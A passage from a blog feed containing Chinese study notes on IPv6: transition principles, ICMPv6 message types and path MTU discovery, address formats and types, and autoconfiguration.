title="lPv6过渡时期建议采用的过渡原则:"></a>lPv6过渡时期建议采用的过渡原则:</h4><ul><li>能直接建立IPv6链路的情况下，使用纯IPv6路由</li><li>不能使用IPv6链路的情况下，IPv6节点间使用隧道技术</li><li>双栈的IPv4/IPv6主机和纯IPv4或纯IPv6网络的主机通信尽量不要采用协议转换，直接自动选择相应的通信协议</li><li>纯IPv6网络和纯IPv4网络主机之间的通信，使用协议转换或应用层网关，所设计的协议转换器或ALG应该尽量保证不修改原有应用</li><li>采用逐步渐进的过渡方式，以保护原有IPv4网络的投资，过渡的技术应尽可能简单，尽量保证IPv4和IPv6之间的互操作性</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IPv6过渡技术&quot;&gt;&lt;a href=&quot;#IPv6过渡技术&quot; class=&quot;headerlink&quot; title=&quot;IPv6过渡技术&quot;&gt;&lt;/a&gt;IPv6过渡技术&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-python&quot; data-la</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ICPMv6协议基础</title>
    <link href="https://shierjinghuang.github.io/2022/12/16/ICMPv6/"/>
    <id>https://shierjinghuang.github.io/2022/12/16/ICMPv6/</id>
    <published>2022-12-16T06:02:43.000Z</published>
    <updated>2022-12-24T05:16:27.771Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h2><p>[TOC]</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握四种差错报文的格式及用途#掌握请求&#x2F;回显报文的格式#理解IPv6的路径MTU发现过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ICMPv6协议概述"><a href="#ICMPv6协议概述" class="headerlink" title="ICMPv6协议概述"></a>ICMPv6协议概述</h3><h4 id="ICMPv6的功能"><a href="#ICMPv6的功能" class="headerlink" title="ICMPv6的功能"></a>ICMPv6的功能</h4><blockquote><p style="color:orange;">IPv6的ICMP(Internet Control Message Protocol)，属于IPv6协议的一个组成部分，IPv6网络中的每一个节点均要实现ICMPv6</p></blockquote><ul><li><p>在IPv6分组<strong>不能被正确处理</strong>时，ICMPv<strong>6向源节点报告分组在传输过程中的出错信息和通告信息</strong>，使网络中的节点可以知道网络中所传输的IPv6分组的情况，以及当前网络状态的重要信息</p></li><li><p><strong>ICMPv6报文作为IPv6分组的数据载荷</strong></p></li></ul><h4 id="lCMPv6与ICMPv4的比较"><a href="#lCMPv6与ICMPv4的比较" class="headerlink" title="lCMPv6与ICMPv4的比较"></a>lCMPv6与ICMPv4的比较</h4><blockquote><p style="color:blue;">ICMPv6与ICMPv4是两个不同的协议，两个版本的ICMP并不兼容</p></blockquote><p>ICMPv6增加的功能包括:</p><ul><li><ul><li>IGMP、ARP、RARP功能被加入到ICMPv6中。</li><li>引入了<strong>邻居发现(Neighbor Discovery)协议</strong>，实现了路由器和前缀发现、地址解析地址自动配置、下一跳地址确定、邻居可达性检测、重复地址检测、重定向等功能</li><li>ICMPv6还支持Mobile lPv6</li></ul></li></ul><h3 id="ICMPv6协议报文格式"><a href="#ICMPv6协议报文格式" class="headerlink" title="ICMPv6协议报文格式"></a>ICMPv6协议报文格式</h3><p>ICMPv6报头由其前一个报头中的下一个报头字段值58来标识。</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ICMPv6报文的一般格式.png" style="zoom:67%;" /><center>ICMPv6报文的一般格式</center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/携带ICMPv6分组的报文格式.png" style="zoom:50%;" /><center>携带ICMPv6分组的报文格式</center>#### 各字段含义<ul><li>类型:8位，标识ICMPv6报文的类型，决定了报文剩余部分的格式</li><li>代码:8位，取决于报文类型，在特定情况下提供更多详细的信息，标识报文类型下一层次的作用</li><li>校验和:16位，对ICMPv6首部和部分IPv6首部中数据的正确性进行检验</li><li>报文主体:对于不同的类型和代码，包含不同的数据。如果是错误报文，则可包含用来帮助故障排除的尽可能多的信息。但<strong>ICMPv6数据包的总大小不能超过IPv6的MTU的最小值1280</strong></li></ul><h3 id="ICMPv6报文类型"><a href="#ICMPv6报文类型" class="headerlink" title="ICMPv6报文类型"></a>ICMPv6报文类型</h3><h4 id="ICMPv6差错报文"><a href="#ICMPv6差错报文" class="headerlink" title="ICMPv6差错报文"></a>ICMPv6差错报文</h4><ul><li>差错报文是由目标节点或中间路由器发送的，用于报告在转发或传送IPv6数据包过程中出现的错误。在所有的ICMPv6差错报文中，8位类型字段中的最高位都为0。因此，类型字段的范围是0~127。</li></ul><h5 id="目的地址失效差错报文"><a href="#目的地址失效差错报文" class="headerlink" title="目的地址失效差错报文"></a>目的地址失效差错报文</h5><blockquote><p style="color:blue;">当数据包无法被转发到目标节点或上层协议时，路由器或目标节点发送ICMPv6目的地址失效差错报文</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/目的地址失效差错报文.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/目的地址失效差错报文代码值.png" style="zoom: 80%;" /><h5 id="包过大差错报文"><a href="#包过大差错报文" class="headerlink" title="包过大差错报文"></a>包过大差错报文</h5><blockquote><p style="color:blue;">数据包无法转发是由于路由器的转发接口的链路MTU小于IPv6数据包的长度，就要发送ICMPv6包过大报文</p></blockquote><ul><li>该ICMPv6错误报文中有一个字段指出导致该问题的链路的MTU值</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/包过大差错报文.png" style="zoom:67%;" /><h5 id="超时报文"><a href="#超时报文" class="headerlink" title="超时报文"></a>超时报文</h5><ul><li>代码为0:当IPv6报头中的跳数限制字段在转发过程中减小为0时，路由器发送ICMPv6超时报文</li><li>代码为1:当目标主机的分片重组定时器超时，目标主机发送，RFC2460规定分片重组时间为60秒</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/报文超时差错报文.png" style="zoom:67%;" /><h5 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h5><blockquote><p>当IPv6报文或扩展报头出现错误，从而导致IPv6不能进行进一步处理时，发送该报文。该报文由路由器或者目标节点发送</p></blockquote><ul><li>代码为0表示遇到错误的报头字段</li><li>代码为1表示遇到无法识别的下一个报头类型</li><li>代码为2表示遇到无法识别的IPv6选项。</li></ul><blockquote><p style="color:blue;">指针字段指出了IPv6数据包中错误发生的位置，其值为从0开始的字节偏移量</p></blockquote><h4 id="ICMPv6信息报文"><a href="#ICMPv6信息报文" class="headerlink" title="ICMPv6信息报文"></a>ICMPv6信息报文</h4><ul><li>信息报文提供诊断功能和附加的主机功能，比如多播侦听发现(MLD）协议和邻居发现协议。在所有的ICMPv6信息报文中，8位类型字段中的最高位都为1。因此，类型字段的范围是128～255。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/ICMPv6信息报文与差错报文.png" style="zoom: 67%;" /><h5 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h5><ul><li>ICMPv6回送请求报文用于发送至目标节点，以请求目标节点立即发回一个回送应答报文</li><li>发送方主机设置标识符字段和序列号字段，用于将收到的回送应答报文与发送的回送请求报文进行匹配</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/回送请求报文.png" style="zoom:67%;" /><h5 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h5><ul><li>ICMPv6回送应答报文用于响应接收到的ICMPv6回送请求报文</li><li>回送应答报文的标识符字段，序列号字段和数据字段的值被置为与回送请求报文中的相应字段一样的值</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/回送应答报文.png" style="zoom:67%;" /><h3 id="ICMP处理规则"><a href="#ICMP处理规则" class="headerlink" title="ICMP处理规则"></a>ICMP处理规则</h3><blockquote><p>如果节点收到一条未知类型的ICMPv6错误报文，必须把它传送给上层协议</p></blockquote><blockquote><p>如果节点收到一条未知类型的ICMPv6信息报文，必须将其丢弃</p></blockquote><p>每一个ICMPv6差错报文（类型&lt;128）在不超过最小IPv6 MTU的情况下，包括尽可能大的引起出错的包。</p><p>网络层协议把ICMPv6差错报文传送到上层协议的进程时，原包中的上层协议字段被取出，用来选择合适的上一层进程来处理错误。如果原包含有一个很大的扩展首部，那么有可能上层协议类型并没有包含在ICMPv6差错报文中。原因是为了满足最小IPv6 MTU的限制，原包被切断了。这种情况下，差错报文在任何IPv6层处理后被丢弃。</p><p>如果接收到的数据包为下列情况之一，则不发送ICMPv6差错报文:</p><pre class="line-numbers language-none"><code class="language-none">ICMPv6错误报文，一个ICMPv6重定向报文，一个发往多播地址的，链路层多播包，链路层广播包，一个源地址不能唯一确定某个单独节点的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对上述情况，存在两个例外，即包过大报文和代码为2，表示不可识别的lPv6选项的参数问题报文。</p><h4 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h4><h5 id="lPv6-MTU"><a href="#lPv6-MTU" class="headerlink" title="lPv6 MTU"></a>lPv6 MTU</h5><ul><li>IPv6要求链路层的最小MTU为1280字节，建议MTU长度最小为1500字节</li><li><strong>PMTU:从源到目的节点的所有链路上最小的链路MTU</strong></li><li><strong>PMTU发现的目的是为了确保可以使用某个路径上支持的最大可能的大小来发送数据包</strong></li></ul><h5 id="路径MTU发现工作过程"><a href="#路径MTU发现工作过程" class="headerlink" title="路径MTU发现工作过程"></a>路径MTU发现工作过程</h5><ul><li>首先主机假定PMTU与第一跳链路的MTU相同，并且使用该大小发送数据包</li><li>如果该数据包对于路径中某个路由器过大，路由器丢弃该数据包并返回类型为“数据包过大”的ICMPv6消息，且该消息中包含下一跳链路的MTU大小</li><li>主机使用这个MTU来把后续的包发往同一目的地。主机发送的数据包肯定不会小于IPv6的最小MTU (1280 Bytes)</li><li>重复上述过程，直到数据包到达目的地。</li></ul><h5 id="PMTU的改变"><a href="#PMTU的改变" class="headerlink" title="PMTU的改变"></a>PMTU的改变</h5><ul><li>由于路由拓扑结构的变化，源节点和目标节点之间的路径会随着时间而改变。·路径MTU的减小，可以通过接收到的ICMPv6包过大报文被立即发现。而路径MTU的增大，则必须通过发送方的检测才能发现。根据RFC1981，发送方可以通过试图发送更长的数据包来进行检测。而这种检测应该在距离接收到ICMPv6包过大报文最少5分钟(建议取10分钟)之后进行</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ICMPv6协议&quot;&gt;&lt;a href=&quot;#ICMPv6协议&quot; class=&quot;headerlink&quot; title=&quot;ICMPv6协议&quot;&gt;&lt;/a&gt;ICMPv6协议&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-Py</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>IPv6协议结构</title>
    <link href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
    <id>https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</id>
    <published>2022-12-16T05:52:23.000Z</published>
    <updated>2022-12-24T03:35:52.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络协议分析-IPv6协议部分"><a href="#网络协议分析-IPv6协议部分" class="headerlink" title="网络协议分析    IPv6协议部分"></a>网络协议分析    IPv6协议部分</h2><p>[TOC]</p><h3 id="网络协议分析之IPv6协议基础"><a href="#网络协议分析之IPv6协议基础" class="headerlink" title="网络协议分析之IPv6协议基础"></a>网络协议分析之IPv6协议基础</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握IPv6协议栈的常用命令</span><span class="token comment">#掌握lPv6单播地址的使用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="IPv6的特征："><a href="#IPv6的特征：" class="headerlink" title="IPv6的特征："></a>IPv6的特征：</h4><h4 id="IPv6地址："><a href="#IPv6地址：" class="headerlink" title="IPv6地址："></a>IPv6地址：</h4><h5 id="IPv6地址空间："><a href="#IPv6地址空间：" class="headerlink" title="IPv6地址空间："></a>IPv6地址空间：</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6地址空间分配情况.png" style="zoom:67%;" /><center>IPv6地址空间分配情况</center><blockquote><p style="color:blue;">IPv6地址有三种表示形式：首选地址，压缩格式和内嵌IPv4的IPv6地址格式</p></blockquote><p><strong>首选格式</strong>：</p><blockquote><p>128位地址用16位边界分成8组，每个组转换成4位十六进制数用冒号分隔，称为冒号十六进制</p></blockquote><p><strong>压缩格式</strong>：</p><blockquote><p style="color:blue;">零压缩:连续为0的组可以压缩为::(双冒号)</p></blockquote><p>删除每组的前导0， 把连续的一段0压缩为:: ，在一个IPv6地址中::只能出现一次 </p><blockquote><p style="color:blue;">零压缩只能在给定地址中使用一次，不能使用零压缩来包括某个组的一部分</p></blockquote><p><strong>IPv4的IPv6地址格式：</strong></p><blockquote><p style="color:black;">在IPv4和IPv6的混合环境中，IPv6地址中的最低32位可以用于表示lPv4地址，即:X:X:X:X:X:d.d.d.d，其中X表示16进制整数，而d表示十进制整数</p></blockquote><h5 id="IPv6格式前缀-FP-Format-Prefix"><a href="#IPv6格式前缀-FP-Format-Prefix" class="headerlink" title="IPv6格式前缀(FP, Format Prefix)"></a>IPv6格式前缀(FP, Format Prefix)</h5><ul><li>类似于IPv4中的CIDR表示法，IPv6地址被分成两个部分：子网前缀和接口标识符</li><li>IPv6地址前缀格式为:IPv6地址/前缀长度<ul><li>1030:0:0:0:C9B4:FF12:48AA:1A2B/60，用于路由的前缀长度为60位。</li><li>前缀是地址的一部分，这部分或者有固定的值，或者是路由或子网的标识。64位前缀用来表示节点所在的单个子网，所有子网都有相应的64位前缀。任何少于64位的前缀,或者是一个路由前缀，或者是包含了部分IPv6地址空间的一个地址范围</li></ul></li></ul><h4 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h4><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6地址结构.png" style="zoom:67%;" /><ul><li>全球路由前缀:识别分配给一个站点的某个特殊地址或地址范围</li><li>子网ID:用于识别站点中的某个链路，一个子网ID与一个链路相关联，也可以将多个子网ID分配给一个链路</li><li>接口ID:用于识别和指明链路上的一个接口，并且接口ID在该链路上必须是唯一的</li></ul><p><strong>接口标识的生成</strong>：由IEEE EUI - 64规范自动生成，设备随机生成，或手工配置。</p><p><strong>EUI - 64规范(Extended Unique ldentifier)</strong></p><ul><li>将48比特的MAC地址转化为64比特的接口标识，因此理论上可多达264个不同的物理接口</li><li>转换方法:在MAC地址的中间插入4位16进制数FFFE，再把从最高位开始的第7位U/L位取反（置1)</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/EUI-64规范.png" style="zoom:67%;" /><h5 id="IPv6地址的分配"><a href="#IPv6地址的分配" class="headerlink" title="IPv6地址的分配"></a>IPv6地址的分配</h5><p><strong>IPv6地址是分配给接口的，在IPv6网络中一个接口可以有一个或多个IPv6地址(单播地址、任播地址和多播地址)</strong></p><blockquote><p style="color:blue;">一个节点的每个接口都需要至少一个单播地址。同时，一个单播地址只能与一个网络接口相关联</p></blockquote><h5 id="IPv6地址类别"><a href="#IPv6地址类别" class="headerlink" title="IPv6地址类别"></a>IPv6地址类别</h5><p>**单播地址(Unicast Address)**：用来标识单一网络接口。送往一个单播地址的包将被传送至该地址标识的接口上。</p><p>**组播地址(Multicast Address)**：用来标识一组网络接口(通常属于不同的节点)。送往一个组播地址的包将被传送至有该地址标识的所有接口上。<br>**任播（泛播）地址(Anycast Address)**：用来标识一组网络接口。送往泛播地址的包将被传送至该地址标识的接口之一(路由距离“最近”的接口)。它是IPv6引入的新的地址类型。</p><h4 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h4><blockquote><p style="color:orange;">单播地址包括全球单播地址、链路本地地址、站点本地地址、特殊地址、兼容地址、NSAP地址</p></blockquote><h5 id="可聚类全球单播地址"><a href="#可聚类全球单播地址" class="headerlink" title="可聚类全球单播地址"></a>可聚类全球单播地址</h5><p>相当于IPv4公共地址，有3个部分:</p><ul><li><p>ISP分配的前缀</p></li><li><p>站点拓扑，组织机构使用ISP分配的一个<strong>48位前缀</strong>，可以用前缀的49—64位共16位把网络划分为子网，最多可以划分65535个子网</p></li><li><p>接口ID:低64位用于标识接口</p></li></ul><p><strong>全球单播地址报文格式：</strong></p><ul><li>FP字段:格式前缀，3位，目前值为”001”，标识这是可集聚全球单播地址</li><li>TLAID字段:顶级集聚标识符，13位，包含最高级地址选路信息，即网络互连中最大的选路信息，可得到最大8192个不同的顶级路由</li><li>RES字段:8位，保留。最终可能会用于扩展顶级或下一级集聚标识符字段。</li><li>NLAID字段:下一级集聚标识符，24位，该标识符被一些机构用于控制顶级集聚以安排地址空间，这些机构能按照他们自己的寻址分级结构来将此24位字段切开用</li><li>SLAID字段:站点级集聚标识符，16位，获得48位前缀的组织机构用来安排内部网络结构，若字段全部用作平面地址空间，则最多可有65535个不同子网</li><li>接口标识符字段:64位，IEEE EUI-64接口标识符</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/全球单播地址报文格式.png"  /><h5 id="链路本地地址-Link-local"><a href="#链路本地地址-Link-local" class="headerlink" title="链路本地地址(Link-local)"></a>链路本地地址(Link-local)</h5><blockquote><p style="color:orange;">链路本地地址具有固定的地址格式，由设备自动生成，范围限制在同一本地链路的节点之间，在邻居发现等IPv6机制中或者没有路由器的网络上用到该类型的地址</p></blockquote><ul><li><p>链路本地地址的组成包括一个特定的前缀<strong>FE80::/64</strong>和低64位的EUI-64接口ID</p></li><li><p>节点启动IPv6协议栈时，节点的每个接口会自动分配一个链路本地地址，这种机制的特点是连接在同一链路上的两个IPv6节点不需要做任何配置就可以通信</p></li><li><p>路由器在源端和目的端对具有链路本地地址的包不予处理，因为永远也不会转发这些包</p></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/链路本地地址.png"  /><p>在lPv6中，一个有可聚类全球单播地址的节点在本地链路上，使用默认IPv6路由器的链路本地地址，而不使用路由器的可聚类全球单播地址。如果必须发生网络重新编址，即单播可聚类全球前缀更改为一个新的单播可聚类全球前缀时，总能使用链路本地地址到达默认路由器。在网络重新编址过程中，节点和路由器的链路本地地址不会发生变化</p><h5 id="站点本地地址-Site-local"><a href="#站点本地地址-Site-local" class="headerlink" title="站点本地地址(Site-local)"></a>站点本地地址(Site-local)</h5><blockquote><p style="color:red;">站点本地地址也是应用范围受限的地址，类似于IPv4专用地址，可供没有申请到可聚类全球单播地址的组织机构使用</blockquote><ul><li>站点本地地址不是自动生成的</li><li>前48位是固定的，其中前10位是固定的二进制位组合1111111011，后面是38位0(FEC0:/48)，接着是提供单位构建子网的16位的子网ID字段，最后是EUI-64接口ID</li><li>站点本地地址能用在内联网中传送数据，但不允许从站点直接选路到全球Internet。站点内的路由器只能在站点内转发包，而不能把包转发到站点外去。 </li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/站点本地地址.png"  /><h5 id="特殊地址和保留地址"><a href="#特殊地址和保留地址" class="headerlink" title="特殊地址和保留地址"></a>特殊地址和保留地址</h5><ul><li>IPv6地址空间中，第一个1/256的大部分空的地址空间用作特殊地址，包括:<ol><li>未指定地址:全0地址，当没有有效地址时，可采用该地址。作为源地址使用，不能被路由器转发。可以表示为0:0:0:0:0:0:0:0或::</li><li>回返地址:除了最低位外，全为0，即0:0:0:0:0:0:0:1或::1。</li><li>嵌有IPv4地址的IPv6地址:一类允许IPv6节点访问不支持IPv6的IPv4节点（IPv4映象地址)，另一类允许IPv6路由器用隧道方式，在IPv4网络上传送IPv6包(IPv4兼容地址)</li></ol></li><li>NSAP和IPX地址分配<ul><li>lPng的目标之一是要统一整个网络世界，使IP、IPX和OSI网络间能进行互操作。为了支持这种互操作性，IPv6为OSI和IPX各保留了1/128地址空间。IPX地址格式尚未精确定义</li><li>NSAP地址分配的描述见RFC1888 (OSI NSAP和IPv6)</li></ul></li></ul><h4 id="多播地址："><a href="#多播地址：" class="headerlink" title="多播地址："></a>多播地址：</h4><blockquote><p style="color:red;">多播指的是源节点发送的单个数据报可以被指明的多个目的节点收到</p></blockquote><ul><li>IPv6协议中的多播地址用最高8位是11111111(FF)来标识多播地址</li><li>多播地址只能用作目的地址。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/多播地址.png" style="zoom:67%;" /><ul><li><p>标识字段：地址格式中的第1个字节为全<code>&quot;1&quot;</code>(FF)，标识其为多播地址</p></li><li><p>标志字段：占4位。目前只定义了第4位，用<code>&quot;0&quot;</code>表示该地址是由Internet编号机构指定的熟知多播地址，<code>1</code>表示特定场合使用的临时多播地址</p></li><li><p>范围字段:占4位，用来限制多播数据流在网络中发送的范围，见下表</p></li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/多播地址范围字段.png" style="zoom:67%;" /><ul><li>组标识符字段:占112位，用于标识多播组，最多可以编码2112个组的ID。</li></ul><h5 id="IPv6具有特别含义的特殊多播地址"><a href="#IPv6具有特别含义的特殊多播地址" class="headerlink" title="IPv6具有特别含义的特殊多播地址"></a>IPv6具有特别含义的特殊多播地址</h5><ul><li>FF01::1表示节点本地范围内所有节点多播地址;</li><li>FF02::1表示链路本地范围内所有节点多播地址;</li><li>FF01:2表示节点本地范围内所有路由器多播地址;</li><li>FF02::2表示链路本地范围内所有路由器多播地址;</li><li>FFO5::2表示站点本地范围内所有路由器多播地址。</li><li>IPv6多播地址中有一种特殊用途的<strong>请求节点(Solicited-node)多播地址</strong>，主要用于重复地址检测(DAD)和获取邻居节点的链路层地址。请求节点多播地址由前缀FFO2::1:FFO0:0/104和单播地址的最后24位组成。</li></ul><p>当节点预订多播地址时，它声明要成为多播的一个成员，于是任何本地路由器将以该节点的名义预订多播地址。同一网络上的其他节点要发送信息到该多播地址时，IP多播包将被封装到链路层多播数据传输单元中，发送给每个订户。从本地网以外来的多播，用同样方法处理，只是传递给路由器，由路由器把包转发给预订节点。</p><blockquote><p style="color:black;">路由器不转发广播包，但对多播而言只要路由器以其它节点的名义预订多播地址，就能有选择地转发多播包</blockquote><h4 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h4><p>任播地址是IPv6协议特有的地址类型</p><blockquote><p style="color:orange;">多个节点共享一个任播地址，但只有一个节点接收给任播地址的数据报。适合于一对一组中的一个(One to One of Many)的通信需求</p></blockquote><blockquote><p style="color:blue;">任播地址用来标识通常属于不同节点的一组网络接口，路由器把目标地址是任播地址的数据报发送给离该路由器"最近"的一个接口</p></blockquote><ul><li>任播地址只能用作IPv6数据报的目的地址，只能分配给IPv6路由器</li><li>任播对某些类型的服务特别有用，尤其是对于C/S之间不需要有特定关系的服务，如DNS、NTP等</li></ul><p>任播地址是从单播地址空间中划分出来的，与单播地址有相同的格式，当一个单播地址属于多个接口时，就是任播地址。因为任播地址在形式上与单播地址无法区分开，一个任播地址的每个成员，必须显式地加以配置，以便识别任播地址</p><p><strong>子网路由器任播地址格式:</strong></p><blockquote><p>子网前缀部分设置为路由器所在子网的前缀，地址的其余位设置为0，发送到这个地址上的数据包会被发送到该子网中的一个路由器上</p></blockquote><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/子网路由器任播地址格式.png" style="zoom: 80%;" /><p><strong>预留的任播地址(RFC 2526)</strong></p><ul><li>在每个子网内，接口标识符值0—127是为子网任播地址分配而保留的，0—125和127为保留，126用于移动lPv6家园代理(Mobile lPv6 Home Agents)的任播</li><li>预留的任播地址不能分配给单播地址，它们的结构按是否含EUl-64分为两类</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/预留的任播地址.png" style="zoom:100%;" /><p><strong>节点必须的IPv6地址</strong></p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/节点必须的IPv6地址.png" style="zoom:67%;" /><p><strong>路由器必须的IPv6地址：</strong></p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/路由器必须的IPv6地址.png" style="zoom: 70%;" /><h4 id="IPv6地址配置技术"><a href="#IPv6地址配置技术" class="headerlink" title="IPv6地址配置技术"></a>IPv6地址配置技术</h4><h5 id="路由器地址配置"><a href="#路由器地址配置" class="headerlink" title="路由器地址配置"></a>路由器地址配置</h5><p>与IPv4方法类似，管理员手工为接口配置一个IPv6地址，并指定前缀长度</p><h5 id="主机地址配置"><a href="#主机地址配置" class="headerlink" title="主机地址配置"></a>主机地址配置</h5><ul><li>考虑到主机用途的多样性，采用自动配置方法，常用的自动配置技术包括:有状态自动配置协议(DHCPv6)和无状态自动配置协议。</li></ul><p><strong>手工配置和检测</strong></p><ol><li>建议用于服务器和重要网络设备</li><li>接口地址配置的内容包括:128位IPv6地址和前缀长度</li><li>IPv6地址配置到接口上以后，需要检测所配置的地址在链路上是否<strong>唯一</strong><ul><li>IPv6重复地址检测<strong>DAD</strong>，属于邻居发现(ND，Neighbor Discovery)协议的功能</li></ul></li></ol><p><strong>自动配置</strong></p><ul><li>赋予主机自己的地址参数，包括地址前缀、接口ID</li><li>赋予主机其它的相关参数，包括路由器地址、跳数、MTU…</li></ul><p><strong>自动配置过程</strong></p><ol><li><p>接口初始化，然后产生“tentative”(实验性)地址</p></li><li><p>对“tentative”地址进行重复地址检测(DAD)</p></li><li><p>接口产生link-local地址，具备IP连接能力</p></li><li><p>决定采用何种自动配置技术</p><ul><li>由Router Advertisement报文及主机配置来决定</li><li>无状态自动配置(stateless autoconfiguration)</li><li>有状态自动配置(stateful autoconfiguration)</li></ul></li><li><p>获得全球地址</p></li></ol><h5 id="即插即用"><a href="#即插即用" class="headerlink" title="即插即用"></a>即插即用</h5><ul><li>lPv6用两种不同机制来支持即插即用，即BOOTP和DHCP。这些协议支持“状态自动配置”，即服务器必须管理和保存每个节点的状态信息</li></ul><p><strong>有状态自动配置与无状态自动配置</strong></p><ul><li>有状态自动配置的问题在于:用户必须保持和管理特殊的自动配置服务器以管理所有“状态”</li><li>对于个人或者小型机构，无状态自动配置是较容易的解决方案。这种机制允许个人节点确定自己的IP配置，而不必向服务器显式请求各节点的信息</li></ul><h5 id="同时使用无状态及有状态两种配置方式"><a href="#同时使用无状态及有状态两种配置方式" class="headerlink" title="同时使用无状态及有状态两种配置方式"></a>同时使用无状态及有状态两种配置方式</h5><ul><li>两种类型自动配置方式的合作比单独使用其中一种更易于实现Internet网络连接的即插即用<ul><li>可以使用无状态自动配置生成一个IPv6地址，然后对附加参数使用有状态的自动配置</li></ul></li><li>无状态自动配置要简单的多，为什么还要使用状态自动配置?<ul><li>无状态自动配置对得到IP地址的节点提供最低程序的监视，任一节点可以连接到链路，通过路由器通告来获知网络和子网信息，并构造有效的链路地址</li><li>如果有DHCP服务器的支持，那么机构可以更紧密地控制网络可配置的节点。同时，只有由网络管理员明确授权的节点才能通过DHCP服务器来配置</li></ul></li></ul><h3 id="IPv6协议结构"><a href="#IPv6协议结构" class="headerlink" title="IPv6协议结构"></a>IPv6协议结构</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握IPv6的报头格式#掌握分片报头的格式及用途#理解IPv6数据包的拆分、重组过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="IPv6数据包结构"><a href="#IPv6数据包结构" class="headerlink" title="IPv6数据包结构"></a>IPv6数据包结构</h4><blockquote><p style="color:orange;">由固定首部(base header)和有效载荷(payload)组成：首部长度变为固定的40字节，称为基本首部，所有的扩展首部和上层数据合起来叫做数据报的有效载荷或净负荷</p></blockquote><ul><li>取消不必要的功能，首部的字段数减少到只有8个</li><li>取消了首部检验和字段，加快了路由器处理数据报的速度</li><li>基本首部的后面允许有零个或多个扩展首部。</li></ul><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据结构.png" style="zoom:67%;" /><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/12/16/IPv6协议结构/IPv6数据包结构示意图.png" style="zoom: 50%;" /><center>IPv6数据包结构示意图</center>#### 基本首部<h5 id="基本首部各字段含义："><a href="#基本首部各字段含义：" class="headerlink" 